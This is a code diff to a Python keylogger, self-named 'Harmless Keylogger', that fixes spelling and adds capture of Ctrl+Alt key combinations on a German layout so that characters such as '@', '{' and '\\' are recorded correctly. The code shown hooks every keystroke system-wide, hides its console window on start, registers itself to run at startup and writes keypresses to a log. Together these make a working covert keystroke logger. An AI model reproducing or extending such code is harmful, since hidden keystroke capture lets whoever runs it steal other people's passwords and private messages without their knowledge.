@@ -21,7 +21,7 @@ import ctypes
 BOOK_PATH = 'myBook'
 # Config File
 CONFIG_FILE = 'keylogger.config.json'
-# Name of The Logger (Be carefull changeing this may results in unremoveable registered autostart)
+# Name of The Logger (Be careful changing this may results in unremovable registered autostart)
 LOGGER_NAME = "Harmless Keylogger"
 # File path
 CURRENT_FILE_PATH = os.path.realpath(sys.argv[0])
@@ -93,7 +93,7 @@ def remove_from_startup():
 # Debug logger
 def log_debug():
     global config, heatmap_buffer
-    if not config.get_hide() == "allways":
+    if not config.get_hide() == "always":
         if len(heatmap_order) > 0:
                 # Print the last pressed key to console
                 if len(heatmap_order[-1]["key"]) == 1:
@@ -170,7 +170,7 @@ def log_keys():
     delete_old_key_presses()
 
     # Start Timer
-    timer = Timer(config.get_save_intervall()/1000, log_keys)
+    timer = Timer(config.get_save_interval()/1000, log_keys)
     timer.name = "Logging"
     timer.start()
 
@@ -232,13 +232,42 @@ def key_callback(event: KeyboardEvent):
     log_key_press(event, pressed_keys.copy())
     
     key_pressed = {}
-    # Key Represention
+    # Key Representation
     # Shift
     if event.scan_code == 42 or event.scan_code == 54 or event.scan_code == 58:
         # remove keys from pressed state
         if(event.scan_code in pressed_keys):
             pressed_keys.remove(event.scan_code)
         return
+    # Ctrl + Alt 
+    elif 29 in pressed_keys and 56 in pressed_keys:
+        name = event.name
+        if event.name == '7':
+            name = '{'
+        elif event.name == '8':
+            name = '['
+        elif event.name == '9':
+            name = ']'
+        elif event.name == '0':
+            name = '}'
+        elif event.name == 'ß':
+            name = '\\'
+        elif event.name == '+':
+            name = '~'
+        elif event.name == '<':
+            name = '|'
+        elif event.name == 'e':
+            name = '€'
+        elif event.name == 'q':
+            name = '@'
+
+        key_pressed = {
+            "name": [name],
+            "scancode": [event.scan_code],
+            "pressed": [pressed_keys.copy()],
+            "value": [" "],
+            "length": 1
+        }
     # Space
     elif event.name == 'space':
         key_pressed = {
@@ -327,14 +356,14 @@ def read_heatmap():
 def hide():
     global visible
     if config.get_hide() == "never":
-        print("Change visibillity is with this config not allowed!")
+        print("Change visibility is with this config not allowed!")
     elif visible: 
         # Hide Console
         window = win32console.GetConsoleWindow()
         win32gui.ShowWindow(window, win32con.SW_HIDE)
         visible = False
         return True
-    elif not config.get_hide() == "allways":
+    elif not config.get_hide() == "always":
         # Unhide Console
         window = win32console.GetConsoleWindow()
         win32gui.ShowWindow(window, win32con.SW_NORMAL)
@@ -347,10 +376,10 @@ def main():
     global visible
     if visible:
         print(LOGGER_NAME + " started")
-    # Hide comand prompt
+    # Hide command prompt
     if config.get_hide() == "ready":
         timer = Timer(5, hide)
-        timer.name = "Ready cooldown"
+        timer.name = "Ready cool down"
         timer.start()
     log_keys()
     # Attache callback for keypress
@@ -359,9 +388,9 @@ def main():
     keyboard.add_hotkey(config.get_pause_hotkey(), pause_logging)
     # To save the buffer (ctrl + alt + s)
     keyboard.add_hotkey(config.get_save_hotkey(), log_local)
-    # To toggle visibillity of window (ctrl + alt + v)
+    # To toggle visibility of window (ctrl + alt + v)
     keyboard.add_hotkey(config.get_visible_hotkey(), hide)
-    # To Exit the Keylogger with safing the buffer (ctrl + alt + e)
+    # To Exit the Keylogger with saving the buffer (ctrl + alt + e)
     keyboard.wait(config.get_exit_hotkey()) 
     if config.get_output() == "local":
         if not log_local() and visible:
@@ -371,14 +400,14 @@ def main():
     exit()
 
 if __name__ == '__main__':
-    # Read the configurarion
+    # Read the configuration
     config = KeyloggerConfig()
     config.read_config(join(DIR_PATH, CONFIG_FILE)) 
     if visible:
         print("Successfully load configuration.")
 
-    # Hide comand prompt
-    if config.get_hide() == "allways" or config.get_hide() == "instant":
+    # Hide command prompt
+    if config.get_hide() == "always" or config.get_hide() == "instant":
         hide()
 
     # Disallowing multiple instances with same prefix
